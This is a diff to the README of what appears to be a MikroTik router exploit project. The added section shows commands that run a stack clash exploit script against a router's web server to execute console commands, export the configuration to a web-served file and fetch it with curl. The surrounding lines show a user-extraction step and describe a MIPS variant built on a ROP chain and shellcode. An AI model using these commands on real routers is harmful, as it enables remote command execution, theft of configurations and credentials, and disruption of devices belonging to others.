@@ -48,6 +48,15 @@ $ sleep 3 # (wait some seconds that www is restarted)
 $ curl -s http://192.168.8.1/winbox/index | ./tools/extract_user.py -
 ```
 
+### Export configs  
+You can execute command in Mikrotik console with `/nova/bin/info`.  
+Eg: `/nova/bin/info "/system reboot"` will reboot the system.  
+```
+$ ./StackClash_x86.py 192.168.8.1 80 www_binary "/nova/bin/info "/export" > /ram/winbox.idx"
+$ sleep 3 # (wait some seconds that www is restarted)
+$ curl -s http://192.168.8.1/winbox/index
+```
+
 ## StackClash_mips  
 Stack clash exploit using two threads with ROP chain + shell code to run bash commands  
 On mips version of www the stack is RWX, so we can jump to the stack.
